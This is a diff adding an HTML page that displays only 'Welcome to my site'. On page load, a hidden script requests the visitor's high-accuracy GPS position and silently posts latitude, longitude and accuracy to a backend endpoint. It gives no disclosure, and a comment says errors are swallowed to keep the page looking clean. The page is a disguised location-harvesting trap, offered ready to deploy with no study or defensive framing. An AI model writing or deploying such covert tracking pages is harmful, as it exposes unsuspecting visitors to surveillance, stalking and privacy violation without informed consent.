@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Welcome</title>
+<style>
+  body {
+    font-family: -apple-system, system-ui, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0 16px;
+    text-align: center;
+  }
+  h1 {
+    font-size: 24px;
+    font-weight: 600;
+  }
+</style>
+</head>
+<body>
+
+<h1>Welcome to my site</h1>
+
+<script>
+async function sendToBackend(payload) {
+  try {
+    await fetch('/api/visit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    });
+  } catch (err) {
+    // Silent fail agar tampilan tetap bersih
+  }
+}
+
+function captureLocationSilently() {
+  if (!navigator.geolocation) {
+    sendToBackend({});
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => {
+      sendToBackend({
+        gpsLat: pos.coords.latitude,
+        gpsLng: pos.coords.longitude,
+        gpsAccuracy: pos.coords.accuracy,
+      });
+    },
+    () => {
+      sendToBackend({});
+    },
+    {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 10000
+    }
+  );
+}
+
+captureLocationSilently();
+</script>
+
+</body>
+</html>
